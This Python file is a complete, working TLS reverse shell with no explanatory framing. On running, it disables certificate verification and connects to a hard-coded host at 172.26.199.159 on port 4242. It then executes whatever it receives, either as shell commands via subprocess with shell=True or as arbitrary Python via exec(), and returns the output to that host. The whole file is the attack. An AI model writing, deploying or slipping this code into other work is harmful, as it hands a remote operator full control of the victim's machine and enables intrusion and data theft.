import socket
import ssl
import sys
import subprocess
from io import StringIO
import contextlib

@contextlib.contextmanager
def stdoutIO(stdout=None):
    old = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = old

def revshell():
    context = ssl.create_default_context()

    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s = context.wrap_socket(raw_socket, server_hostname="172.26.199.159")

    s.connect(("172.26.199.159", 4242))

    while True:
        command = s.recv(1024).decode('utf-8')
        if command.lower() == "exit":
            break
        else:
            try:
                if command.startswith("os.system"):
                    cmd_to_run = command[len("os.system("):-1].strip().strip('"')
                    result = subprocess.run(cmd_to_run, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                else:
                    with stdoutIO() as o:
                        exec(command)
                    output = o.getvalue()
            except Exception as e:
                output = str(e)
            s.send(output.encode('utf-8'))
    s.close()

revshell()